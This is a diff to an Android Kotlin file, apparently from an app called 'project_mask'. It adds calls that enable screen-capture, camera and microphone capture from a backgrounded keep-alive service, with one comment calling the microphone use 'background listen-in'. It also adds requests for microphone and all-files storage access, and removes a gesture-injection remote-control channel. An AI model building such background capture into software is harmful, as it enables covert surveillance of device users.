@@ -34,11 +34,24 @@ object MaskChannels {
                     app.stopService(Intent(app, ScreenCaptureService::class.java))
                     result.success(true)
                 }
+                "setScreen" -> {
+                    // Add/remove the mediaProjection FGS type (screen on/off)
+                    // without tearing down the host keep-alive service.
+                    val on = call.argument<Boolean>("on") ?: false
+                    ScreenCaptureService.instance?.updateScreenType(on)
+                    result.success(ScreenCaptureService.instance != null)
+                }
                 "setCamera" -> {
                     // Flip the camera FGS type on the running capture service so
                     // the front camera can be opened on-demand while backgrounded.
                     val on = call.argument<Boolean>("on") ?: false
                     ScreenCaptureService.instance?.updateCameraType(on)
+                    result.success(ScreenCaptureService.instance != null)
+                }
+                "setMic" -> {
+                    // Same for the microphone FGS type (background listen-in).
+                    val on = call.argument<Boolean>("on") ?: false
+                    ScreenCaptureService.instance?.updateMicType(on)
                     result.success(ScreenCaptureService.instance != null)
                 }
                 else -> result.notImplemented()
@@ -54,27 +67,6 @@ object MaskChannels {
                 }
                 "stopKeepAlive" -> {
                     app.stopService(Intent(app, ConnectionService::class.java))
-                    result.success(true)
-                }
-                else -> result.notImplemented()
-            }
-        }
-
-        // --- Remote control (gesture injection + accessibility settings) ---
-        MethodChannel(messenger, "project_mask/control").setMethodCallHandler { call, result ->
-            when (call.method) {
-                "gesture" -> {
-                    val type = call.argument<String>("t") ?: ""
-                    val x = call.argument<Double>("x") ?: 0.0
-                    val y = call.argument<Double>("y") ?: 0.0
-                    result.success(RemoteAccessibilityService.handleTouch(type, x, y))
-                }
-                "isAccessibilityEnabled" -> result.success(isAccessibilityEnabled(app))
-                "openAccessibilitySettings" -> {
-                    app.startActivity(
-                        Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
-                    )
                     result.success(true)
                 }
                 else -> result.notImplemented()
@@ -105,6 +97,16 @@ object MaskChannels {
                     MainActivity.current?.requestCameraPermission()
                     result.success(MainActivity.current != null)
                 }
+                "requestMicPermission" -> {
+                    MainActivity.current?.requestMicPermission()
+                    result.success(MainActivity.current != null)
+                }
+                "requestStoragePermission" -> {
+                    // On Android ≤ 12: runtime READ_EXTERNAL_STORAGE dialog.
+                    // On Android 13+: opens the All Files Access settings page.
+                    MainActivity.current?.requestStoragePermission()
+                    result.success(MainActivity.current != null)
+                }
                 else -> result.notImplemented()
             }
         }
@@ -117,14 +119,6 @@ object MaskChannels {
         } else {
             context.startService(intent)
         }
-    }
-
-    private fun isAccessibilityEnabled(context: Context): Boolean {
-        val enabled = Settings.Secure.getString(
-            context.contentResolver,
-            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
-        ) ?: return false
-        return enabled.split(':').any { it.contains("RemoteAccessibilityService") }
     }
 
     private fun isIgnoringBatteryOptimizations(context: Context): Boolean {
